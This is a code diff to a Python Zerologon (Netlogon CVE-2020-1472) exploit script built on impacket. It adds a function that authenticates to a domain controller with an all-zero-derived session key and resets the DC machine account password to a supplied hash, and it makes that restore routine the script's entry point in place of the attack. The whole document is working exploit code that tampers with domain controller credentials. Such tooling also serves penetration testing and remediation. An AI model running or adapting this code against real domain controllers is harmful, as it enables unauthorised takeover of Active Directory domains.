@@ -12,6 +12,7 @@ from binascii import hexlify, unhexlify
 from subprocess import check_call
 from Cryptodome.Cipher import DES, AES, ARC4
 from struct import pack, unpack
+import os
 
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
 MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
@@ -131,6 +132,64 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer, originalpw):
   except BaseException as ex:
     fail(f'Unexpected error: {ex}.')
 
+def try_restore_originalpw(dc_handle, dc_ip, target_computer, originalpw):
+  # Connect to the DC's Netlogon service.
+  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
+  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
+  rpc_con.connect()
+  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
+  
+  try:
+    # Send challenge
+    clientChallenge = os.urandom(8)
+    serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', clientChallenge)
+    serverChallenge = serverChallengeResp['ServerChallenge']
+    print("server challenge", serverChallenge)
+
+    sessionKey = nrpc.ComputeSessionKeyAES(None, clientChallenge, serverChallenge, unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))
+    print("session key", sessionKey)
+
+    clientCredential = AES.new(sessionKey, mode=AES.MODE_CFB, IV=b'\x00'*16, segment_size=8).encrypt(clientChallenge)
+    print("client credential", clientCredential)
+    
+    # Send authentication request
+    flags = 0x212fffff
+    server_auth = nrpc.hNetrServerAuthenticate3(
+      rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+      target_computer + '\x00', clientCredential, flags
+    )
+
+    # It worked!
+    assert server_auth['ErrorCode'] == 0
+    print()
+    server_auth.dump()
+
+    clientStoredCred = clientCredential + b'\x00' * 4   # clientCredential + Timestamp
+    authenticatorCrypt = AES.new(sessionKey, mode=AES.MODE_CFB, IV=b'\x00'*16, segment_size=8).encrypt(clientStoredCred)
+    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+    authenticator['Credential'] = authenticatorCrypt[:8]
+    authenticator['Timestamp'] = authenticatorCrypt[8:]
+
+    nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
+    nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)
+    
+    request = NetrServerPasswordSet()
+    request['PrimaryName'] = NULL
+    request['AccountName'] = target_computer + '$\x00'
+    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+    request['ComputerName'] = target_computer + '\x00'
+    request["Authenticator"] = authenticator
+    pwdata = impacket.crypto.SamEncryptNTLMHash(unhexlify(originalpw), sessionKey)
+    request["UasNewPassword"] = pwdata
+    resp = rpc_con.request(request)
+
+    assert resp['ErrorCode'] == 0
+    print()
+    resp.dump()
+
+    print('Success! Password hash restored: {}'.format(originalpw))
+  except Exception as ex:
+    fail(f'Unexpected error: {ex}.')
 
 def perform_attack(dc_handle, dc_ip, target_computer, originalpw):
   # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
@@ -161,5 +220,5 @@ if __name__ == '__main__':
     [_, dc_name, dc_ip, originalpw] = sys.argv
 
     dc_name = dc_name.rstrip('$')
-    perform_attack('\\\\' + dc_name, dc_ip, dc_name, originalpw)
+    try_restore_originalpw('\\\\' + dc_name, dc_ip, dc_name, originalpw)
 
